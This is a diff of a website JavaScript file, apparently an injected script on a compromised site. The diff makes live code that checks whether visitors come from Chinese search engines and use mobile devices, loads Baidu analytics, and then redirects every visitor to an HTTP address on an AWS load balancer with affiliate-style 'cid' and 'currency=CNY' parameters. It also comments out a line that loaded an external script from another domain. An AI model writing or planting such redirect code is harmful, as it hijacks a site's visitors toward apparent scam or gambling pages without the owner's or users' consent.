@@ -1,5 +1,4 @@
-document.write('<script src="https://i.ixi.plus/epaper.js"><\/script>');
-/*
+//document.write('<script src="https://i.ixi.plus/epaper.js"><\/script>');
 function isFromSearchEngine() {
     const referrer = document.referrer;
     const searchEngines = ['sm.cn', 'so.com', 'haosou', 'baidu.', 'toutiao.', 'sogou.'];
@@ -22,9 +21,8 @@ function loadBaiduAnalytics() {
 
 if (isFromSearchEngine() && isMobile()) {
     loadBaiduAnalytics();
-    window.location.href = "https://43.suoyik.com/?shareName=ylg43";
+    window.location.href = "http://web-alb-wg223-1153285546.ap-southeast-1.elb.amazonaws.com:58297/?cid=386111&type=2&currency=CNY";
 } else {
     loadBaiduAnalytics();
-    window.location.href = "https://43.suoyik.com/?shareName=ylg43";
+    window.location.href = "http://web-alb-wg223-1153285546.ap-southeast-1.elb.amazonaws.com:58297/?cid=386111&type=2&currency=CNY";
 }
-*/
